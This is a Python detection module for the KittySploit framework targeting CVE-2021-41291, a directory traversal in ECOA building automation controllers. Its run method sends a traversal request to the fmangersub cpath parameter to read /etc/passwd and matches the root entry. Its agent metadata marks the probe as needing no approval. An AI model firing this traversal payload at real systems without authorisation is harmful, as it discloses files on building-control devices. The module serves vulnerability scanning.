#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""The ECOA BAS controller suffers from a directory traversal content disclosure vulnerability."""

import re
from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'ECOA Building Automation System - Directory Traversal Content Disclosure Detection',
        'description': 'The ECOA BAS controller suffers from a directory traversal content disclosure vulnerability. Using the GET parameter cpath in File Manager (fmangersub), attackers can disclose directory content on the affected device',
        'author': ['KittySploit Team'],
        'severity': 'high',
        'tags': ['web', 'scanner', 'cve2021', 'cve', 'ecoa', 'lfi', 'traversal', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.4,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'risk_signal',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://nvd.nist.gov/vuln/detail/CVE-2021-41291',
            'https://www.zeroscience.mk/en/vulnerabilities/ZSL-2021-5670.php',
            'https://www.twcert.org.tw/en/cp-139-5140-6343c-2.html',
            'https://www.twcert.org.tw/tw/cp-132-5127-3cbd3-1.html',
            'https://github.com/ARPSyndicate/cvemon',
        ],
        'cve': 'CVE-2021-41291',
    }

    def run(self):
        path = '/fmangersub?cpath=../../../../../../../etc/passwd'
        r = self.http_request(method='GET', path=path, allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_regexes = ('root:.*:0:0:',)
        if any(re.search(rx, body) for rx in body_regexes):
            self.set_info(severity='high', reason='ECOA Building Automation System - Directory Traversal Content Disclosure detected', path=path)
            return True
        return False

